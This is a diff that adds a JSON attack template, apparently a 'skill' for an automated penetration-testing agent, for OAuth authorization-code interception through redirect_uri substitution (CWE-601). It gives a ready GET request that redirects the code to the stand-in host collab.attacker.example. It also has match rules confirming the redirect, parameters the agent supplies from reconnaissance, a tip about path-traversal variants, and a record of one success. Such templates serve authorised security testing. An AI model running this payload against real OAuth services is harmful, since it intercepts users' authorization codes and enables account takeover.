@@ -1,0 +1,33 @@
+{
+  "name": "elite/OAuth redirect_uri origin substitution",
+  "description": "[critical] OAuth authorization-code interception via redirect_uri substitution (RFC 6749 s10.6; PortSwigger 'OAuth account hijacking via redirect_uri'): the authorization endpoint is asked to redirect the code to the collaborator origin. Keywords: oauth redirect_uri open redirect authorization code interception account takeover sso. ctrl: bare authorize request errors without redirecting to the attacker origin -> not falsified. authorize_url = OAuth /authorize endpoint; client_id = any client id visible during recon (agent supplies). Copy skill for path-traversal variants (redirect_uri=https://client/../attacker).",
+  "cwe": "CWE-601",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{authorize_url}}?client_id={{client_id}}&redirect_uri=https%3A%2F%2Fcollab.attacker.example%2F&response_type=code&state=rt9k"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 302
+    },
+    {
+      "type": "header_regex",
+      "request": "payload",
+      "pattern": "location:\\s*https://collab\\.attacker\\.example",
+      "present": true
+    }
+  ],
+  "params": [
+    "authorize_url",
+    "client_id"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "b4fbb5529fa5",
+  "created": "2026-11-05T18:20:19.655790+00:00",
+  "last_used": "2026-11-05T18:20:19.655790+00:00"
+}
